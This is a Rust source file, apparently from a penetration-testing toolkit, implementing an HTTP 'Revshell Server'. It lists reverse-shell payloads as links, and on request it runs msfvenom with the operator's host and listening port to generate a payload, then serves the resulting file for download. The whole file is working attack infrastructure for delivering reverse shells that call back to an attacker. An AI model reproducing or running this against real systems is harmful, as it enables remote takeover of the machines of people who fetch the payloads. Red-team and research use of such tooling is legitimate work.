/* Revshell Server
  [ ] done
  [ ] refactor
*/
use std::convert::Infallible;
use std::fs;
use std::process::Command;

use hyper::{Body, Request, Response, StatusCode};
// todo: do
use hyper::http::response::Builder;

use crate::*;
use crate::revshell::revshell_model::RevShells;
use crate::shared::config::SHARED_DATA;

pub async fn listen(req: Request<Body>, revshells: RevShells, lhost: String) -> Result<Response<Body>, Infallible> {
    if &req.uri().to_string() == "/" {
        return return_list_of_revshells(&revshells).await;
    }
    let shared_data = SHARED_DATA.clone();

    match revshells.revshells().iter().find(|revshell| "/".to_owned() + &revshell.link_name() == req.uri().to_string()) {
        Some(revshell) => {
            let cmd = revshell.command(lhost.as_str(), *shared_data.lport_current.lock().await);
            let temp_file_path = &revshell.file_path();

            logger_trace!("{}", format!("running {} [~] `{}`", revshell.rev_type(), &cmd.clone().italic()));

            let mut cmd_args = cmd.trim().split(" ").collect::<Vec<&str>>();
            cmd_args.push("-o");
            cmd_args.push(temp_file_path);

            let mut command = Command::new("msfvenom");
            command.args(&cmd_args[1..cmd_args.len()]);

            match command.status() {
                Ok(output) => {
                    if output.success() {
                        logger_debug!(format!(
                            "{} revshell > {} created and downloaded.",
                            Icons::Download.to_string().blue().bold(),
                            revshell.title()
                        ));

                        return Ok(Builder::new()
                            .status(StatusCode::OK)
                            .body(Body::from(fs::read(revshell.file_path()).unwrap()))
                            .unwrap());
                    } else {
                        return Ok(Builder::new()
                            .status(StatusCode::INTERNAL_SERVER_ERROR)
                            .body(Body::empty())
                            .unwrap());
                    }
                }
                Err(_) => {
                    return Ok(Builder::new()
                        .status(StatusCode::INTERNAL_SERVER_ERROR)
                        .body(Body::empty())
                        .unwrap());
                }
            }
        }
        None => {
            return Ok(Builder::new()
                .status(StatusCode::NOT_FOUND)
                .body(Body::empty())
                .unwrap());
        }
    }
}

async fn return_list_of_revshells(revshells: &RevShells) -> Result<Response<Body>, Infallible> {
    let mut result_html = String::new();
    result_html.push_str("<!DOCTYPE html><html><head><!-- <link rel=\"icon\" href=\"favicon.ico\" type=\"image/x-icon\"> --></head><body>");
    for revshell in revshells.revshells() {
        result_html.push_str(
            format!(
                "{} / <a href=\"{}\">{}</a><br>",
                revshell.rev_type(),
                revshell.link_name(),
                revshell.title()
            ).as_str(),
        );
    }
    result_html.push_str("</html>");

    Ok(Builder::new()
        .status(StatusCode::OK)
        .body(Body::from(result_html))
        .unwrap())
}